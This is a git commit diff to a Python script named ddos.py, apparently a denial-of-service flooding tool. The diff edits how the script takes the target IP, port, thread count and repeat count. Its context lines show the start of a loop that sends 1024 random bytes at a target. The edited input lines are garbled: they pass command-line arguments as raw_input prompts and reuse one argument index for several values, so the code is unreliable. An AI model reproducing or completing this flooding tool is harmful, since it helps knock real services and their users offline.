be84d101c5c27b9e1e9ecef8e4fd6e13f7e8a1db
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-09 05:23:52 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -5,11 +5,11 @@ import socket
 import threading
 
 import sys
-ip = str(raw_input(sys.argv[12:]))
-port = int(raw_input(sys.argv[5:]))
-choice = str(raw_input(sys.argv[1:]))
-times = int(raw_input(sys.argv[5:]))
-threads = int(raw_input(sys.argv[5:]))
+ip = str(raw_input(sys.argv[12]))
+port = int(raw_input(sys.argv[5]))
+choice = str(raw_input(sys.argv[1]))
+times = int(raw_input(sys.argv[5]))
+threads = int(raw_input(sys.argv[5]))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
